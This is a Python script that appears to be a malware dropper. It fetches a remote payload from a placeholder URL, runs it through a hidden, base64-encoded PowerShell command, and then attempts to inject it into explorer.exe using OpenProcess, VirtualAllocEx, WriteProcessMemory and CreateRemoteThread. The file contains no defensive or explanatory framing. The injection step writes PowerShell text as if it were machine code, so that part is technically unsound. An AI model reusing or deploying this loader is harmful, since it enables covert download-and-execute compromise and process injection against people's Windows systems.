import os
import base64
import ctypes
import requests

def fetch_payload():
    """Fetch PowerShell payload directly from the provided URL."""
    url = "https://example.com/payload"  # Placeholder URL to be dynamically updated
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException as e:
        print(f"[ERROR] Failed to fetch payload: {e}")
        return None

def execute_in_memory(payload):
    """Execute the PowerShell payload directly in memory."""
    try:
        # Encode payload in Base64 (required for PowerShell inline execution)
        payload_base64 = base64.b64encode(payload.encode('utf-16le')).decode()
        # Inline PowerShell execution
        command = f"powershell.exe -NoP -NonI -W Hidden -EncodedCommand {payload_base64}"
        os.system(command)
        print("[INFO] Payload executed in memory successfully.")
    except Exception as e:
        print(f"[ERROR] Failed to execute payload in memory: {e}")

def process_injection(payload):
    """Inject the payload into a legitimate process (e.g., explorer.exe)."""
    try:
        # Locate explorer.exe process
        explorer_pid = find_process("explorer.exe")
        if not explorer_pid:
            print("[ERROR] explorer.exe not found.")
            return

        # Open explorer.exe process
        process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, explorer_pid)
        if not process_handle:
            print("[ERROR] Unable to open explorer.exe.")
            return

        # Allocate memory in the target process
        payload_size = len(payload) + 1
        remote_memory = ctypes.windll.kernel32.VirtualAllocEx(
            process_handle, None, payload_size, 0x3000, 0x40
        )
        if not remote_memory:
            print("[ERROR] Memory allocation failed.")
            return

        # Write payload to the allocated memory
        written = ctypes.c_size_t(0)
        ctypes.windll.kernel32.WriteProcessMemory(
            process_handle, remote_memory, payload.encode('utf-8'), payload_size, ctypes.byref(written)
        )

        # Create a remote thread to execute the payload
        thread_id = ctypes.windll.kernel32.CreateRemoteThread(
            process_handle, None, 0, remote_memory, None, 0, None
        )
        if not thread_id:
            print("[ERROR] Unable to create remote thread.")
        else:
            print("[INFO] Payload injected into explorer.exe successfully.")

        # Clean up
        ctypes.windll.kernel32.CloseHandle(process_handle)

    except Exception as e:
        print(f"[ERROR] Failed during process injection: {e}")

def find_process(process_name):
    """Find the PID of the target process by its name."""
    try:
        import psutil
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_name:
                return proc.info['pid']
    except ImportError:
        print("[ERROR] psutil library not installed.")
    return None

def main():
    print("[INFO] Fetching payload...")
    payload = fetch_payload()

    if payload:
        print("[INFO] Payload fetched successfully. Executing...")
        # Execute the payload in memory
        execute_in_memory(payload)

        # Inject the payload into a process
        process_injection(payload)
    else:
        print("[ERROR] Unable to proceed without a valid payload.")

if __name__ == "__main__":
    main()
